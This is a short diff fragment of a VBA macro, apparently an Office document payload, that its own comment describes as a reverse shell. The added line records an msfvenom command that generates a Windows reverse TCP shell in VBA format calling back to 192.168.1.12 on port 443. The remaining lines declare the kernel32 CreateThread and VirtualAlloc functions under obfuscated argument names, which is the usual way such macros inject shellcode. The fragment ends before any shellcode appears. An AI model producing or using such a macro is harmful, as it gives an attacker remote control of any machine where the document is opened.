@@ -1,4 +1,5 @@
 'Reverse shell. Lhost 192.168.1.2, Rport 443. Will trigger AV alerts
+'msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp -e generic/none -f vba lhost=192.168.1.12 lport=443
 #If Vba7 Then
 	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Qmxkpf As Long, ByVal Penexcojy As Long, ByVal Nqsuyqwn As LongPtr, Wrvw As Long, ByVal Xivr As Long, Kjt As Long) As LongPtr
 	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Odnehnj As Long, ByVal Cyq As Long, ByVal Ymslxnm As Long, ByVal Hsuqmi As Long) As LongPtr
